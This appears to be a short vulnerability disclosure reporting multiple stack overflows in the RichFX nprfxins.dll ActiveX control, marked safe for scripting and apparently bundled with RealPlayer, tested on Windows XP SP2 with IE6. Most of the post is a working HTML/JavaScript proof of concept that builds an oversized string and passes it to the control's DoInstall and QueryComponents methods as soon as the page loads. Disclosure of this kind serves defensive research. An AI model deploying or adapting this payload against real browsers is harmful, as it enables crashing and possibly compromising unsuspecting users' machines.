There are multiple stack overflows in the RichFX nprfxins.dll ActiveX Control. I almost positive that this control was installed with RealNetworks RealPlayer. This was tested on Windows XP SP2 fully patched and IE6. This control is marked safe for scripting. I have not tested code execution. PoC as follows:

------------
<!--

-->
<html>
 <head>
  <script language="JavaScript" DEFER>
    function Check() {
    var s = "AAAA";

    while (s.length < 999999) s=s+s;

     var obj = new ActiveXObject("RFXInstMgr.RFXInstMgr"); //{47F59200-8783-11D2-8343-00A0C945A819}


     obj.DoInstall(s);   
     obj.QueryComponents(s);    

   }
  </script>

 </head>
 <body onload="JavaScript: return Check();">

 </body>
</html>
